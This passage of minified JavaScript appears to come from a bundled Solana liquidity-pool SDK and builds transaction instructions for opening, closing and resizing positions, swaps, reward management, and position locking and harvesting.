            PT("tickArrayLowerStartIndex"),
            PT("tickArrayUpperStartIndex"),
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            GT("withMetadata"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          T = [...(S ? [{ pubkey: S, isSigner: !1, isWritable: !0 }] : [])],
          B = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: p, isSigner: !1, isWritable: !1 },
            { pubkey: m, isSigner: !1, isWritable: !1 },
            ...T,
          ],
          C = dt.alloc(_.span);
        _.encode(
          {
            tickLowerIndex: g,
            tickUpperIndex: y,
            tickArrayLowerStartIndex: w,
            tickArrayUpperStartIndex: b,
            liquidity: new Yn(0),
            amountMaxA: "MintA" === A ? k : I,
            amountMaxB: "MintA" === A ? I : k,
            withMetadata: "create" === v,
            baseFlag: "MintA" === A,
            optionBaseFlag: 1,
          },
          C
        );
        let E = dt.from([...sE.openPositionWithTokenEx, ...C]);
        return new vs({ keys: B, programId: t, data: E });
      }
      static async openPositionFromLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        tickLower: r,
        tickUpper: o,
        liquidity: i,
        amountMaxA: s,
        amountMaxB: a,
        withMetadata: u,
        getEphemeralSigners: c,
        nft2022: l,
      }) {
        let d,
          f = [];
        if (c) d = new Ji((await c(1))[0]);
        else {
          let t = Xu.generate();
          f.push(t), (d = t.publicKey);
        }
        let [h, p] = [new Ji(t.programId), new Ji(t.id)],
          m = HC.getTickArrayStartIndexByTick(r, t.config.tickSpacing),
          g = HC.getTickArrayStartIndexByTick(o, t.config.tickSpacing),
          { publicKey: y } = AC(h, p, m),
          { publicKey: w } = AC(h, p, g),
          { publicKey: b } = y_(n.wallet, d, l ? Cc : Bc),
          { publicKey: v } = SC(d),
          { publicKey: A } = IC(h, d),
          { publicKey: k } = kC(h, p, r, o);
        return {
          address: {
            nftMint: d,
            tickArrayLower: y,
            tickArrayUpper: w,
            positionNftAccount: b,
            metadataAccount: v,
            personalPosition: A,
            protocolPosition: k,
          },
          instructions: [
            l
              ? this.openPositionFromLiquidityInstruction22(
                  h,
                  n.wallet,
                  p,
                  n.wallet,
                  d,
                  b,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(e.mintA.address),
                  new Ji(e.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                )
              : this.openPositionFromLiquidityInstruction(
                  h,
                  n.wallet,
                  p,
                  n.wallet,
                  d,
                  b,
                  v,
                  k,
                  y,
                  w,
                  A,
                  n.tokenAccountA,
                  n.tokenAccountB,
                  new Ji(e.vault.A),
                  new Ji(e.vault.B),
                  new Ji(e.mintA.address),
                  new Ji(e.mintB.address),
                  r,
                  o,
                  m,
                  g,
                  i,
                  s,
                  a,
                  u,
                  NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [
                    m,
                    g,
                  ])
                    ? TC(h, p).publicKey
                    : void 0
                ),
          ],
          signers: f,
          instructionTypes: [kS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static closePositionInstruction(t, e, n, r, o, i) {
        let s = JT([]),
          a = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: i ? Cc : Bc, isSigner: !1, isWritable: !1 },
          ],
          u = dt.alloc(s.span);
        s.encode({}, u);
        let c = dt.from([...sE.closePosition, ...u]);
        return new vs({ keys: a, programId: t, data: c });
      }
      static closePositionInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        ownerPosition: r,
        nft2022: o,
      }) {
        let i = new Ji(t.programId),
          s = o
            ? y_(n.wallet, r.nftMint, Cc).publicKey
            : y_(n.wallet, r.nftMint, Bc).publicKey,
          { publicKey: a } = IC(i, r.nftMint),
          u = [];
        return (
          u.push(
            this.closePositionInstruction(i, n.wallet, r.nftMint, s, a, o)
          ),
          {
            address: { positionNftAccount: s, personalPosition: a },
            signers: [],
            instructions: u,
            instructionTypes: [_S],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static increasePositionFromLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y
      ) {
        let w = JT([
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          b = [...(y ? [{ pubkey: y, isSigner: !1, isWritable: !0 }] : [])],
          v = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...b,
          ],
          A = dt.alloc(w.span);
        w.encode(
          {
            liquidity: p,
            amountMaxA: m,
            amountMaxB: g,
            optionBaseFlag: 0,
            baseFlag: !1,
          },
          A
        );
        let k = dt.from([...sE.increaseLiquidity, ...A]);
        return new vs({ keys: v, programId: t, data: k });
      }
      static increasePositionFromLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        liquidity: o,
        amountMaxA: i,
        amountMaxB: s,
        nft2022: a,
      }) {
        let [u, c] = [new Ji(t.programId), new Ji(t.id)],
          l = HC.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          d = HC.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: f } = AC(u, c, l),
          { publicKey: h } = AC(u, c, d),
          { publicKey: p } = y_(r.wallet, n.nftMint, a ? Cc : Bc),
          { publicKey: m } = IC(u, n.nftMint),
          { publicKey: g } = kC(u, c, n.tickLower, n.tickUpper);
        return {
          address: {
            tickArrayLower: f,
            tickArrayUpper: h,
            positionNftAccount: p,
            personalPosition: m,
            protocolPosition: g,
          },
          signers: [],
          instructions: [
            this.increasePositionFromLiquidityInstruction(
              u,
              r.wallet,
              p,
              m,
              c,
              g,
              f,
              h,
              r.tokenAccountA,
              r.tokenAccountB,
              new Ji(e.vault.A),
              new Ji(e.vault.B),
              new Ji(t.mintA.address),
              new Ji(t.mintB.address),
              o,
              i,
              s,
              NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [l, d])
                ? TC(u, c).publicKey
                : void 0
            ),
          ],
          instructionTypes: [IS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static increasePositionFromBaseInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        base: o,
        baseAmount: i,
        otherAmountMax: s,
        nft2022: a,
      }) {
        let [u, c] = [new Ji(t.programId), new Ji(t.id)],
          l = HC.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          d = HC.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: f } = AC(u, c, l),
          { publicKey: h } = AC(u, c, d),
          { publicKey: p } = y_(r.wallet, n.nftMint, a ? Cc : Bc),
          { publicKey: m } = IC(u, n.nftMint),
          { publicKey: g } = kC(u, c, n.tickLower, n.tickUpper);
        return {
          address: {
            tickArrayLower: f,
            tickArrayUpper: h,
            positionNftAccount: p,
            personalPosition: m,
            protocolPosition: g,
          },
          instructions: [
            this.increasePositionFromBaseInstruction(
              u,
              r.wallet,
              p,
              m,
              c,
              g,
              f,
              h,
              r.tokenAccountA,
              r.tokenAccountB,
              new Ji(e.vault.A),
              new Ji(e.vault.B),
              new Ji(t.mintA.address),
              new Ji(t.mintB.address),
              o,
              i,
              s,
              NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [l, d])
                ? TC(u, c).publicKey
                : void 0
            ),
          ],
          signers: [],
          instructionTypes: [IS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static increasePositionFromBaseInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y
      ) {
        let w = JT([
            KT("liquidity"),
            zT("amountMaxA"),
            zT("amountMaxB"),
            UT("optionBaseFlag"),
            GT("baseFlag"),
          ]),
          b = [...(y ? [{ pubkey: y, isSigner: !1, isWritable: !0 }] : [])],
          v = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...b,
          ],
          A = dt.alloc(w.span);
        w.encode(
          {
            liquidity: new Yn(0),
            amountMaxA: "MintA" === p ? m : g,
            amountMaxB: "MintA" === p ? g : m,
            baseFlag: "MintA" === p,
            optionBaseFlag: 1,
          },
          A
        );
        let k = dt.from([...sE.increaseLiquidity, ...A]);
        return new vs({ keys: v, programId: t, data: k });
      }
      static decreaseLiquidityInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g,
        y,
        w
      ) {
        let b = JT([KT("liquidity"), zT("amountMinA"), zT("amountMinB")]),
          v = [
            ...(w ? [{ pubkey: w, isSigner: !1, isWritable: !0 }] : []),
            ...p
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          A = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
            { pubkey: f, isSigner: !1, isWritable: !1 },
            { pubkey: h, isSigner: !1, isWritable: !1 },
            ...v,
          ],
          k = dt.alloc(b.span);
        b.encode({ liquidity: m, amountMinA: g, amountMinB: y }, k);
        let I = dt.from([...sE.decreaseLiquidity, ...k]);
        return new vs({ keys: A, programId: t, data: I });
      }
      static decreaseLiquidityInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerPosition: n,
        ownerInfo: r,
        liquidity: o,
        amountMinA: i,
        amountMinB: s,
        programId: a,
        nft2022: u,
      }) {
        let [c, l] = [new Ji(t.programId), new Ji(t.id)],
          d = HC.getTickArrayStartIndexByTick(
            n.tickLower,
            t.config.tickSpacing
          ),
          f = HC.getTickArrayStartIndexByTick(
            n.tickUpper,
            t.config.tickSpacing
          ),
          { publicKey: h } = AC(c, l, d),
          { publicKey: p } = AC(c, l, f),
          { publicKey: m } = y_(r.wallet, n.nftMint, u ? Cc : a),
          { publicKey: g } = IC(c, n.nftMint),
          { publicKey: y } = kC(c, l, n.tickLower, n.tickUpper),
          w = [];
        for (let A = 0; A < t.rewardDefaultInfos.length; A++)
          w.push({
            poolRewardVault: new Ji(e.rewardInfos[A].vault),
            ownerRewardVault: r.rewardAccounts[A],
            rewardMint: new Ji(t.rewardDefaultInfos[A].mint.address),
          });
        let b = [],
          v = this.decreaseLiquidityInstruction(
            c,
            r.wallet,
            m,
            g,
            l,
            y,
            h,
            p,
            r.tokenAccountA,
            r.tokenAccountB,
            new Ji(e.vault.A),
            new Ji(e.vault.B),
            new Ji(t.mintA.address),
            new Ji(t.mintB.address),
            w,
            o,
            i,
            s,
            NC.isOverflowDefaultTickarrayBitmap(t.config.tickSpacing, [d, f])
              ? TC(c, l).publicKey
              : void 0
          );
        return (
          b.push(v),
          {
            address: {
              tickArrayLower: h,
              tickArrayUpper: p,
              positionNftAccount: m,
              personalPosition: g,
              protocolPosition: y,
            },
            signers: [],
            instructions: b,
            instructionTypes: [SS],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static swapInstruction(
        t,
        e,
        n,
        r,
        o,
        i,
        s,
        a,
        u,
        c,
        l,
        d,
        f,
        h,
        p,
        m,
        g
      ) {
        let y = JT([
            zT("amount"),
            zT("otherAmountThreshold"),
            KT("sqrtPriceLimitX64"),
            GT("isBaseInput"),
          ]),
          w = [
            ...(g ? [{ pubkey: g, isSigner: !1, isWritable: !0 }] : []),
            ...l.map((t) => ({ pubkey: t, isSigner: !1, isWritable: !0 })),
          ],
          b = [
            { pubkey: e, isSigner: !0, isWritable: !1 },
            { pubkey: r, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !1 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            ...w,
          ],
          v = dt.alloc(y.span);
        y.encode(
          {
            amount: f,
            otherAmountThreshold: h,
            sqrtPriceLimitX64: p,
            isBaseInput: m,
          },
          v
        );
        let A = dt.from([...sE.swap, ...v]);
        return new vs({ keys: b, programId: t, data: A });
      }
      static makeSwapBaseInInstructions({
        poolInfo: t,
        poolKeys: e,
        observationId: n,
        ownerInfo: r,
        inputMint: o,
        amountIn: i,
        amountOutMin: s,
        sqrtPriceLimitX64: a,
        remainingAccounts: u,
      }) {
        let [c, l] = [new Ji(t.programId), new Ji(t.id)],
          [d, f] = [new Ji(e.vault.A), new Ji(e.vault.B)],
          [h, p] = [new Ji(t.mintA.address), new Ji(t.mintB.address)],
          m = t.mintA.address === o.toString();
        return {
          signers: [],
          instructions: [
            this.swapInstruction(
              c,
              r.wallet,
              l,
              new Ji(t.config.id),
              m ? r.tokenAccountA : r.tokenAccountB,
              m ? r.tokenAccountB : r.tokenAccountA,
              m ? d : f,
              m ? f : d,
              m ? h : p,
              m ? p : h,
              u,
              n,
              i,
              s,
              a,
              !0,
              TC(c, l).publicKey
            ),
          ],
          instructionTypes: [TS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {},
        };
      }
      static makeSwapBaseOutInstructions({
        poolInfo: t,
        poolKeys: e,
        observationId: n,
        ownerInfo: r,
        outputMint: o,
        amountOut: i,
        amountInMax: s,
        sqrtPriceLimitX64: a,
        remainingAccounts: u,
      }) {
        let [c, l] = [new Ji(t.programId), new Ji(t.id)],
          [d, f] = [new Ji(e.vault.A), new Ji(e.vault.B)],
          [h, p] = [new Ji(t.mintA.address), new Ji(t.mintB.address)],
          m = t.mintA.address === o.toBase58();
        return {
          signers: [],
          instructions: [
            this.swapInstruction(
              c,
              r.wallet,
              l,
              new Ji(t.config.id),
              m ? r.tokenAccountB : r.tokenAccountA,
              m ? r.tokenAccountA : r.tokenAccountB,
              m ? f : d,
              m ? d : f,
              m ? p : h,
              m ? h : p,
              u,
              n,
              i,
              s,
              a,
              !1,
              TC(c, l).publicKey
            ),
          ],
          instructionTypes: [BS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
          address: {},
        };
      }
      static initRewardInstruction(t, e, n, r, o, i, s, a, u, c, l, d) {
        let f = JT([
            zT("openTime"),
            zT("endTime"),
            KT("emissionsPerSecondX64"),
          ]),
          h = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !1 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
          ],
          p = dt.alloc(f.span);
        f.encode(
          { openTime: II(c), endTime: II(l), emissionsPerSecondX64: d },
          p
        );
        let m = dt.from([...sE.initReward, ...p]);
        return new vs({ keys: h, programId: t, data: m });
      }
      static initRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfo: r,
      }) {
        let [o, i] = [new Ji(t.programId), new Ji(t.id)],
          s = (function (t, e, n) {
            return f_([pC, e.toBuffer(), n.toBuffer()], t);
          })(o, i, r.mint).publicKey,
          a = _C(o).publicKey;
        return {
          address: { poolRewardVault: s, operationId: a },
          signers: [],
          instructions: [
            this.initRewardInstruction(
              o,
              n.wallet,
              i,
              a,
              new Ji(t.config.id),
              n.tokenAccount,
              r.programId,
              r.mint,
              s,
              r.openTime,
              r.endTime,
              r.emissionsPerSecondX64
            ),
          ],
          instructionTypes: [CS],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static setRewardInstruction(t, e, n, r, o, i, s, a, u, c, l, d) {
        let f = JT([
            UT("rewardIndex"),
            KT("emissionsPerSecondX64"),
            zT("openTime"),
            zT("endTime"),
          ]),
          h = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
          ],
          p = dt.alloc(f.span);
        f.encode(
          {
            rewardIndex: u,
            emissionsPerSecondX64: d,
            openTime: II(c),
            endTime: II(l),
          },
          p
        );
        let m = dt.from([...sE.setRewardEmissions, ...p]);
        return new vs({ keys: h, programId: t, data: m });
      }
      static setRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardInfo: r,
      }) {
        let o,
          i,
          s,
          [a, u] = [new Ji(t.programId), new Ji(t.id)];
        for (let l = 0; l < t.rewardDefaultInfos.length; l++)
          t.rewardDefaultInfos[l].mint.address === r.mint.toString() &&
            ((o = l),
            (i = new Ji(e.rewardInfos[l].vault)),
            (s = new Ji(e.rewardInfos[l].mint.address)));
        (void 0 === o || void 0 === i) &&
          iE.logWithError(
            "reward mint check error",
            "no reward mint",
            t.rewardDefaultInfos
          );
        let c = _C(a).publicKey;
        return {
          address: { rewardVault: i, operationId: c },
          signers: [],
          instructions: [
            this.setRewardInstruction(
              a,
              n.wallet,
              u,
              c,
              new Ji(t.config.id),
              n.tokenAccount,
              i,
              s,
              o,
              r.openTime,
              r.endTime,
              r.emissionsPerSecondX64
            ),
          ],
          instructionTypes: [ES],
          lookupTableAddress: e.lookupTableAccount
            ? [e.lookupTableAccount]
            : [],
        };
      }
      static collectRewardInstruction(t, e, n, r, o, i, s) {
        let a = JT([UT("rewardIndex")]),
          u = [
            { pubkey: e, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !0 },
            { pubkey: i, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: qI, isSigner: !1, isWritable: !1 },
          ],
          c = dt.alloc(a.span);
        a.encode({ rewardIndex: s }, c);
        let l = dt.from([...sE.collectReward, ...c]);
        return new vs({ keys: u, programId: t, data: l });
      }
      static collectRewardInstructions({
        poolInfo: t,
        poolKeys: e,
        ownerInfo: n,
        rewardMint: r,
      }) {
        let o,
          i,
          [s, a] = [new Ji(t.programId), new Ji(t.id)];
        for (let u = 0; u < t.rewardDefaultInfos.length; u++)
          t.rewardDefaultInfos[u].mint.address === r.toString() &&
            ((o = u), (i = new Ji(e.rewardInfos[u].vault)));
        return (
          (void 0 === o || void 0 === i) &&
            iE.logWithError(
              "reward mint check error",
              "no reward mint",
              t.rewardDefaultInfos
            ),
          {
            address: { rewardVault: i },
            signers: [],
            instructions: [
              this.collectRewardInstruction(
                s,
                n.wallet,
                a,
                n.tokenAccount,
                i,
                r,
                o
              ),
            ],
            instructionTypes: [xS],
            lookupTableAddress: e.lookupTableAccount
              ? [e.lookupTableAccount]
              : [],
          }
        );
      }
      static async makeLockPositions({
        programId: t,
        authProgramId: e,
        poolProgramId: n,
        payer: r,
        wallet: o,
        nftMint: i,
        nft2022: s,
        getEphemeralSigners: a,
      }) {
        let u,
          c = [];
        if (a) u = new Ji((await a(1))[0]);
        else {
          let t = Xu.generate();
          c.push(t), (u = t.publicKey);
        }
        let l = s ? y_(o, i, Cc).publicKey : y_(o, i, Bc).publicKey,
          { publicKey: d } = IC(n, i),
          f = EC(t, u).publicKey,
          h = y_(o, u, Bc).publicKey,
          p = SC(u).publicKey;
        return {
          address: {
            positionId: d,
            lockPositionId: f,
            lockNftAccount: h,
            lockNftMint: u,
            positionNftAccount: l,
            metadataAccount: p,
          },
          instructions: [
            cE.lockPositionInstructionV2({
              programId: t,
              auth: e,
              payer: r,
              positionOwner: o,
              lockOwner: o,
              positionNftAccount: l,
              positionId: d,
              lockPositionId: f,
              lockNftMint: u,
              lockNftAccount: h,
              metadataAccount: p,
              withMetadata: !0,
              nft2022: s,
              positionNftMint: i,
              authPositionNftAccount: y_(e, i, s ? Cc : Bc).publicKey,
              positionNftProgram: s ? Cc : Bc,
            }),
          ],
          signers: c,
          instructionTypes: [PS],
          lookupTableAddress: [],
        };
      }
      static lockPositionInstructionV2({
        programId: t,
        auth: e,
        payer: n,
        positionOwner: r,
        lockOwner: o,
        positionNftAccount: i,
        positionId: s,
        positionNftMint: a,
        authPositionNftAccount: u,
        positionNftProgram: c,
        lockPositionId: l,
        lockNftMint: d,
        lockNftAccount: f,
        metadataAccount: h,
        withMetadata: p,
      }) {
        let m = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: n, isSigner: !0, isWritable: !0 },
            { pubkey: r, isSigner: !0, isWritable: !0 },
            { pubkey: o, isSigner: !1, isWritable: !1 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: l, isSigner: !1, isWritable: !0 },
            { pubkey: d, isSigner: !0, isWritable: !0 },
            { pubkey: f, isSigner: !1, isWritable: !0 },
            { pubkey: h, isSigner: !1, isWritable: !0 },
            { pubkey: FI, isSigner: !1, isWritable: !1 },
            { pubkey: Ec, isSigner: !1, isWritable: !1 },
            { pubkey: KI, isSigner: !1, isWritable: !1 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: c, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
          ],
          g = JT([GT("withMetadata")]),
          y = dt.alloc(g.span);
        g.encode({ withMetadata: p }, y);
        let w = dt.from([...aE, ...y]);
        return new vs({ keys: m, programId: t, data: w });
      }
      static lockPositionInstruction({
        programId: t,
        authProgramId: e,
        poolProgramId: n,
        owner: r,
        positionNft: o,
      }) {
        let { publicKey: i } = y_(r, o, Bc),
          { publicKey: s } = IC(n, o),
          a = [
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: r, isSigner: !0, isWritable: !1 },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !1 },
            { pubkey: CC(t, s).publicKey, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
          ];
        return new vs({ keys: a, programId: t, data: dt.from(aE) });
      }
      static harvestLockPositionInstruction(t) {
        let [e, n] = [new Ji(t.poolKeys.programId), new Ji(t.poolKeys.id)],
          r = HC.getTickArrayStartIndexByTick(
            t.ownerPosition.tickLower,
            t.poolKeys.config.tickSpacing
          ),
          o = HC.getTickArrayStartIndexByTick(
            t.ownerPosition.tickUpper,
            t.poolKeys.config.tickSpacing
          ),
          { publicKey: i } = AC(e, n, r),
          { publicKey: s } = AC(e, n, o),
          { publicKey: a } = y_(t.owner, t.ownerPosition.nftMint, Bc),
          { publicKey: u } = IC(e, t.ownerPosition.nftMint),
          { publicKey: c } = kC(
            e,
            n,
            t.ownerPosition.tickLower,
            t.ownerPosition.tickUpper
          ),
          l = [];
        for (let h = 0; h < t.poolKeys.rewardInfos.length; h++)
          l.push({
            poolRewardVault: new Ji(t.poolKeys.rewardInfos[h].vault),
            ownerRewardVault: t.ownerRewardAccounts[h],
            rewardMint: new Ji(t.poolKeys.rewardInfos[h].mint.address),
          });
        let d = [
            ...l
              .map((t) => [
                { pubkey: t.poolRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.ownerRewardVault, isSigner: !1, isWritable: !0 },
                { pubkey: t.rewardMint, isSigner: !1, isWritable: !1 },
              ])
              .flat(),
          ],
          f = [
            { pubkey: t.authProgramId, isSigner: !1, isWritable: !1 },
            {
              pubkey: CC(t.programId, u).publicKey,
              isSigner: !1,
              isWritable: !1,
            },
            { pubkey: e, isSigner: !1, isWritable: !1 },
            { pubkey: t.owner, isSigner: !0, isWritable: !1 },
            { pubkey: a, isSigner: !1, isWritable: !0 },
            { pubkey: u, isSigner: !1, isWritable: !0 },
            { pubkey: n, isSigner: !1, isWritable: !0 },
            { pubkey: c, isSigner: !1, isWritable: !0 },
            {
              pubkey: new Ji(t.poolKeys.vault.A),
              isSigner: !1,
              isWritable: !0,
            },
            {
              pubkey: new Ji(t.poolKeys.vault.B),
              isSigner: !1,
              isWritable: !0,
            },
            { pubkey: i, isSigner: !1, isWritable: !0 },
            { pubkey: s, isSigner: !1, isWritable: !0 },
            { pubkey: t.userVaultA, isSigner: !1, isWritable: !0 },
            { pubkey: t.userVaultB, isSigner: !1, isWritable: !0 },
            { pubkey: Bc, isSigner: !1, isWritable: !1 },
            { pubkey: Cc, isSigner: !1, isWritable: !1 },
            { pubkey: zI, isSigner: !1, isWritable: !1 },
            {
              pubkey: new Ji(t.poolKeys.mintA.address),
              isSigner: !1,
              isWritable: !1,
            },
            {
              pubkey: new Ji(t.poolKeys.mintB.address),
              isSigner: !1,
              isWritable: !1,
            },
            ...d,
          ];
